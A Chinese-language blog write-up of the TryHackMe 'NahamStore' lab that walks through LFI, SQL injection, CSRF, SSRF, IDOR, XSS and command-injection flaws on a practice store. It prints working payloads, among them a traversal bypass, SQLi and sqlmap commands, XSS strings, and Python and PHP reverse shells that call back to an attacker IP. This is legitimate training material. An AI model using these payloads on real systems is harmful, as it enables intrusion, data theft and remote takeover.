

# NahamStore

- 漏洞赏金
- web安全

NahamStore的创建是为了测试您在NahamSec的“漏洞赏金狩猎和Web应用程序黑客入门”Udemy课程中学到的知识。 部署计算机，获得 IP 地址后，进入下一步！

---

## 写在前面

可能我的顺序，跟别人以及题目都不太一样，有点乱，但是这是正常的。

这个房间很有意思，涵盖了许多常见web漏洞

---

## 设置

要开始挑战，您需要在 /etc/hosts 或 c：\windows\system32\drivers\etc\hosts 文件指向 您部署的 TryHackMe 盒子。

例如：

    10.10.110.169                  nahamstore.thm

什么时候 枚举子域时，应针对 nahamstore.com 域执行该枚举。找到子域后，您需要在 /etc/hosts 或 c：\windows\system32\drivers\etc\hosts 文件指向 朝向已部署的 TryHackMe 盒子 IP 地址，并将.com替换为 。.thm。例如，如果您发现子域 whatever.nahamstore.com 您将添加以下条目：

    10.10.110.169          something.nahamstore.thm

您现在可以在浏览器中查看 http://something.nahamstore.thm。

任务可以按任何顺序执行，但我们建议从子域枚举开始。

---

## 端口扫描

循例 nmap扫：

    PORT     STATE SERVICE
    22/tcp   open  ssh
    80/tcp   open  http
    8000/tcp open  http-alt

进入80端口的web

![在这里插入图片描述](https://img-blog.csdnimg.cn/3f5abecdefb3479f8d110a08b6aa57ec.png)

## LFI

查看源代码，首先发现的就是：

![在这里插入图片描述](https://img-blog.csdnimg.cn/ea11ac29212a46458cd8db4e5d5a2264.png)

可能存在文件包含

经过尝试，后端仅仅只是过滤掉"点点杠" 并没有禁止访问

因此使用:

	....//....//....//....//....//

就可以绕过，但是几乎没有权限访问许多文件

题目告诉我们flag在/lfi/flag.txt，最终payload:

	http://nahamstore.thm/product/picture/?file=....//....//....//....//....//....//lfi/flag.txt

注意：flag只有抓包才能看见，flag在响应体中

![在这里插入图片描述](https://img-blog.csdnimg.cn/23965a53d7c24ff68fcb8aae91414fc9.png)

## sql injection - 1

主页有两篇东西，随便点击去发现可能存在sql注入

![在这里插入图片描述](https://img-blog.csdnimg.cn/dbf396813ec944b49d29b5ee5f6084e5.png)

存在sql注入，题目告诉我们flag在sqli_one表的flag列中，直接查看flag

![在这里插入图片描述](https://img-blog.csdnimg.cn/88fc9e4ee56e48ac9ca2691544ff2fb7.png)
## CSRF - 1

后台修改密码处，抓包查看，很明显，这里很可能会导致csrf攻击

![在这里插入图片描述](https://img-blog.csdnimg.cn/aaacd89e6f4343a8a8ecda185b92e32d.png)

## CSRF - 2

修改邮箱处

![在这里插入图片描述](https://img-blog.csdnimg.cn/632dd6c877a8414e91537b4c0ff660dc.png)

虽然有csrf_token，但是后端弱验证，只需要将csrf_protect删除，一样可以修改成功

![在这里插入图片描述](https://img-blog.csdnimg.cn/4d20f3ce43794fd7944d3ba56e1b496e.png)

## CSRF - 3

删除用户处

![在这里插入图片描述](https://img-blog.csdnimg.cn/b5ce7dc0c7a84fbfafed7cb8ca4eed11.png)

很明显，这里的csrf_token是用base64编码的，并且是固定的数值

## SQL Injection - 2

后台退货处

![在这里插入图片描述](https://img-blog.csdnimg.cn/7583568bfe6f4df78fd92668c8255cc2.png)

随便输了点东西，看这个回显，看到order number我一下联想到sql注入

![在这里插入图片描述](https://img-blog.csdnimg.cn/f061616ad38f4c9997a936ead12e0b4d.png)

果然，时间盲注，POC:

	-1;  select * from  sqli_two where flag like '{212%' or sleep(5);--

爆字符这种无聊的事情就交给sqlmap去做吧

	sqlmap -r ./req -D nahamstore -T sqli_two -C flag --dump

![在这里插入图片描述](https://img-blog.csdnimg.cn/dcdb8f8929774807a1a02e22112ca60f.png)

## SSRF

在商品的“check stock”按钮，发现该请求的参数包含一个域名，使用@符绕过成功访问到攻击机

![在这里插入图片描述](https://img-blog.csdnimg.cn/24f955a99c3f44ac828fbe3b68b11cac.png)
在stock.nahamstore.thm中也没有什么发现，

我对着所有子域以及进行了目录扫描，均没有发现什么

所以可以猜测stock.nahamstore.thm调用内部的api，现在有ssrf，我们可以利用其来帮助我们探测内部信息

一开始我直接对着server开冲，结果ffuf扫了上百万条都没扫出来

	server=stock.nahamstore.thm@FUZZ.nahamstore.thm

然后我又去看看题目：

- 应用程序存在 SSRF 漏洞，请参阅如何利用它来查看不应可用的 API。

也就是说子域名字包含api，但又不是api那么有可能是：

	xxx-api.nahamstore.thm

然后又开扫，又没扫出来，然后我打开wireshark，发现全是：

	 504 Gateway Time-out
	 又或者 Bad Gateway

我仔细想了想，然后在扫描的过程中访问nahamstore.thm，发现也访问不进去了

**这时候我懂了，扫描变ddos了，直接给它给d死了**

然后我将ffuf线程数降低到10以下，虽然很慢很卡，但至少不死，至少还有响应回来

![在这里插入图片描述](https://img-blog.csdnimg.cn/eec56121f85848bf8837a02c3994c9bb.png)

成功扫到，即internal-api子域

payload:

	ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://nahamstore.thm/stockcheck' -X POST -d 'product_id=2&server=stock.nahamstore.thm@FUZZ-api.nahamstore.thm' -H 'Host: nahamstore.thm' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -t 5

查看internal-api.nahamstore.thm:

	{"error":"Unknown Endpoint or Method Requested"}

嗯，应该是product/2拼接到了internal-api.nahamstore.thm

我们可以使用#注释掉后面的东西:

	product_id=2&server=stock.nahamstore.thm@internal-api.nahamstore.thm#

结果：

	{"server":"internal-api.nahamstore.com","endpoints":["\/orders"]}

访问/orders

![在这里插入图片描述](https://img-blog.csdnimg.cn/fc6bfbaa6ea54411bfc12388335f8d09.png)

通过这些id访问，这些是订单信息，题目要求我们找到Jimmy Jones的信用卡号码，那就挨个挨个找一下

![在这里插入图片描述](https://img-blog.csdnimg.cn/9a3f5f14df374dc593da00d8a43c204b.png)


## Open Redirect - 1

在添加地址这里，添加的这个包通过参数redirect_url来进行重定向到/basket

![在这里插入图片描述](https://img-blog.csdnimg.cn/e19971caa3084cd7a87fc421fb85d85f.png)


## IDOR - 1

紧接着在选择已有的地址的时候，有一个包存在IDOR

![在这里插入图片描述](https://img-blog.csdnimg.cn/c65488a2b7714cadbaf5c39a3bd5366b.png)

成功越权访问到其他用户的订单

## IDOR - 2

紧接着在后台的order，查看以购买的商品订单，有一个转pdf的功能，抓包改包：

![在这里插入图片描述](https://img-blog.csdnimg.cn/9655c63c2750418c8565475e578a178f.png)

回显：

	Order does not belong to this user_id


尝试添加user_id依然不行

这里需要使用%26进行绕过

![在这里插入图片描述](https://img-blog.csdnimg.cn/a141e576432b4838a9e931e1c10b73a2.png)


![在这里插入图片描述](https://img-blog.csdnimg.cn/9c53bf59a31f4c2bbfe0fcdabf81f234.png)

### 为什么可以这样做？

通过这张图片，其实对这里还有一个疑问为什么这能绕过

我想明白了。

首先，/pdf-generator只接收两个参数：what和id

所以我们尝试各种传入user_id都没有被正常处理

- 那为什么可以%26绕过呢？
- user_id又是如何被正常解析出来并被处理的呢？

你可能会想/pdf-generator将url参数参数二次解析了,第二次解析的时候将user_id解析了出来，

我告诉你，对一半，既然/pdf-generator只接受what和id，说明程序不会从http请求中提取user_id来操作，不要求user_id，即使二次解析将user_id解析出来又有什么用呢，程序又不会使用url参数中的user_id。

那，为什么对一半呢，因为它确实是二次解析：

首先

/pdf-generator的功能并不是由它自身来完成，而是像上面ssrf一样，调用了某个api来完成相应的操作，而api需要user_id

当我们使用%26的时候在/pdf-generator就会被解析为：

	what=order
	id=%26user_id=3

这时候user_id包含在id参数中

当/pdf-generator拿着这两个参数去请求api的时候：

	what=order&id=&user_id=3

由于一次urldecode，这一次user_id被正常拼接到parameters中

最终api将会解析出三个参数，api将获得并使用我们传递的user_id

good

## Open Redirect - 2

对着nahamstore.thm/?FUZZ=http://baidu.com进行fuzz：

	ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u 'http://nahamstore.thm/?FUZZ=http://baidu.com' -mc 301,302

	r                       [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 254ms]

收工，睡觉，剩下的漏洞明天再找


## XSS - 1

访问marketing.nahamstore.thm，随便访问一个不存在的页面，返回了/?error，通过error回显错误信息

![在这里插入图片描述](https://img-blog.csdnimg.cn/298d6f1036e84b2b8b2186fdb0cb575a.png)

## XSS - 2

添加商品到购物车，在购物车点击商品会附带name参数，查看源代码可以发现该参数控制页面title标签，很容易就可以绕过

![在这里插入图片描述](https://img-blog.csdnimg.cn/50f6a6fdf688427f9ab9dbee87cccf48.png)

## XSS - 3

购买商品，付款这里，购买后会显示user agent，burp修改ua

![在这里插入图片描述](https://img-blog.csdnimg.cn/ff7782472a2744c9882e65157484efba.png)


![在这里插入图片描述](https://img-blog.csdnimg.cn/2345dce5abf94551af2d3de0bd9f8b83.png)

## XSS - 4

商品退货处，查看源代码可以看到被textarea包裹，也是简单绕过

![在这里插入图片描述](https://img-blog.csdnimg.cn/3f7c0d15ee1c4d31b8cdb0d9375929bd.png)

	</textarea><script>alert('hack');</script>

![在这里插入图片描述](https://img-blog.csdnimg.cn/65c63a77ff484f15aab4eb8d890d440b.png)

## XSS - 5

访问任意不存在的目录，路径会注入到页面中，也是简单标签绕过

![在这里插入图片描述](https://img-blog.csdnimg.cn/f6152cc91dfb4259aa669a56c8716a7d.png)

## XSS - 6

主页的搜索表单中，查看源代码：

```javascript
</html><script>
    var search = ''alert('hack')'';
    $.get('/search-products?q=' + search,function(resp){
        if( resp.length == 0 ){

            $('.product-list').html('<div class="text-center" style="margin:10px">No matching products found</div>');

        }else {
            $.each(resp, function (a, b) {
                $('.product-list').append('<div class="col-md-4">' +
                    '<div class="product_holder" style="border:1px solid #ececec;padding: 15px;margin-bottom:15px">' +
                    '<div class="image text-center"><a href="/product?id=' + b.id + '"><img class="img-thumbnail" src="/product/picture/?file=' + b.img + '.jpg"></a></div>' +
                    '<div class="text-center" style="font-size:20px"><strong><a href="/product?id=' + b.id + '">' + b.name + '</a></strong></div>' +
                    '<div class="text-center"><strong>$' + b.cost + '</strong></div>' +
                    '<div class="text-center" style="margin-top:10px"><a href="/product?id=' + b.id + '" class="btn btn-success">View</a></div>' +
                    '</div>' +
                    '</div>');
            });
        }
    });
</script>
```

很明显，我们输入的数据被拼接到search变量中，通过字符串拼接“+”来达到逃逸引号并且被正常执行的目的：

	'%2balert('hack');%2b'

注意需要将加号进行urlencode

![在这里插入图片描述](https://img-blog.csdnimg.cn/64374f30b3d44bd6aeaa0cb850936136.png)

## XSS - 7

在商品页面处

![在这里插入图片描述](https://img-blog.csdnimg.cn/ae022f2edcc14d7c923a8c89d48190a7.png)

post参数discount没有用处，但是把它拿到get请求上来，猜测discount从$_REQUEST从取参数，将会覆盖掉discount的初始值

但是这里会把单引号和括号给过滤掉，我们这里需要使用双引号逃逸，如果尝试：

![在这里插入图片描述](https://img-blog.csdnimg.cn/67efafc0653b4a899485eadbdd6e41b2.png)

很明显，这是不行的，可以将后面的双引号作为其他参数：

![在这里插入图片描述](https://img-blog.csdnimg.cn/873206910cea4197982cf1d0ee2d987f.png)

这样alert将被成功执行：

![在这里插入图片描述](https://img-blog.csdnimg.cn/95b2aaf8095d4e8c9a705828da2785cd.png)

## RCE - 1

对于rce，这个站基本上许多功能都看完了，应该没有哪里能rce，所以我把眼光放到了调用api的那两个页面上

没错，又是那个转pdf的功能，对着idfuzzing

最终结果是使用反引号就可以执行任意命令

![在这里插入图片描述](https://img-blog.csdnimg.cn/6ab3e5b585d5411c8ff249eb7db32a2e.png)

这里通过python来getshell，payload:

	what=order&id=5`python3+-c+'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.14.39.48",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`

![在这里插入图片描述](https://img-blog.csdnimg.cn/ab349fba655144eb8924659c3ef0e598.png)

### 验证想法

还记得昨天的idor吗，通过shell，我找到了相关代码：

![在这里插入图片描述](https://img-blog.csdnimg.cn/3368d85661e44a0d982d06ab0cd0847c.png)

我的猜想果然没错

## 侦察

利用rce，查看/etc/hosts，发现几个子域：

	172.17.0.1      nahamstore-2020.nahamstore.thm
	172.17.0.1      nahamstore-2020-dev.nahamstore.thm

![在这里插入图片描述](https://img-blog.csdnimg.cn/a309ceed05b1406b889bb570273e3a0f.png)

对着api再扫一波：

![在这里插入图片描述](https://img-blog.csdnimg.cn/d07f1bd749e44d4ab48412bd39429736.png)

/api/customers回显：

	"customer_id is required"

简单枚举一下就可以找到Jimmy Jones的ssn

![在这里插入图片描述](https://img-blog.csdnimg.cn/d03a866e6cc743c392ae8b0eee139a43.png)

## RCE - 2

8000端口的web什么都没有，扫一波

![在这里插入图片描述](https://img-blog.csdnimg.cn/27a4e5524e6840d78394550725282bec.png)

这是一个登录页面，弱口令就进去了 admin:admin

很明显能看出，这里后台可以编辑marketing子域的页面

修改页面为payload:

```php
<?php
$sock=fsockopen("10.14.39.48",8888);$proc=proc_open("/bin/bash -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

访问被修改的页面，成功getshell:

![在这里插入图片描述](https://img-blog.csdnimg.cn/0af314b206524356b992bdef4f92f3aa.png)
## XXE

我对XXE还是比较陌生，所以这里也是看wp学着做的，事后去多了解了一下xxe

## 结束

打了两天，回顾了许多当时渗透测试基础path中的web以及owasp top 10，我觉得我对xxe还是比较生疏，得找几道xxe的题做做。

全程burp suite立大功

整体来讲，这个房间真的非常不错，前几天我一直不舍得打，一直留到现在，如果有更多这样的房间那就太好了
